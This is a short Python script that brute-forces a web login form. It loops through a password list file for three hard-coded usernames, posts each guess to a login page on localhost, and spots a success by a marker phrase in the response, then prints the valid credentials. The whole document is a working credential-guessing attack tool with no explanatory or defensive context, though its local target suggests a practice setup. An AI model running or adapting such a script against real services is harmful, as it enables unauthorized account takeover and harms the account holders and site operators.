import requests
import sys

target = "http://127.0.0.1:8000/users/login/"
usernames = ["ll_admin", "damian", "mike"]
passwords = "pass_list.txt"
needle = "keep a list"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode()}\r")
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>] Valid password '{password.decode()}' found for user '{username}'!")
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for '{username}'")
        sys.stdout.write("\n")